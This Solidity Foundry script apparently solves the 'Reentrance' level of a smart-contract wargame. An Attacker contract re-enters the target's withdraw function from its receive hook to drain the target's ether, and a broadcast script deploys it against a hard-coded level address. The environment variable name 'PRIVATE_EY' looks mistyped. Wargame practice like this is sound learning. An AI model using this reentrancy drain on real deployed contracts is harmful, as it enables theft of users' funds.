// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

import {Script} from "forge-std/Script.sol";
import {Reentrance} from "../src/level10/Reentrance.sol";

contract Attacker {
    Reentrance target;
    bool isOnAttack = false;

    constructor(address targetAddr) public {
        target = Reentrance(payable(targetAddr));
    }

    function attack(uint amount) public {
        isOnAttack = true;
        target.donate{value: amount}(address(this));
        target.withdraw(amount);
    }

    receive() external payable {
        if (isOnAttack && address(target).balance >= msg.value) {
            target.withdraw(msg.value);
        }
    }
}

contract CallContractScript is Script {
    function run() external {
        // 指定私钥，可以从环境变量中获取，例如：process.env.PRIVATE_KEY
        uint256 privateKey = vm.envUint("PRIVATE_EY");

        // 初始化一个签名者
        vm.startBroadcast(privateKey);

        address levelAddr = 0x5506958fC2AB6709357d9cB7F813cfb3a387b5B7;

        Attacker attacker = new Attacker(levelAddr);

        uint amount = 0.001 ether; // level 合约当前balance
        (bool success, ) = address(attacker).call{value: amount}(""); // 先发送 ether 给 attacker
        require(success, "fund attacker failed");

        attacker.attack(amount);

        vm.stopBroadcast();
    }
}
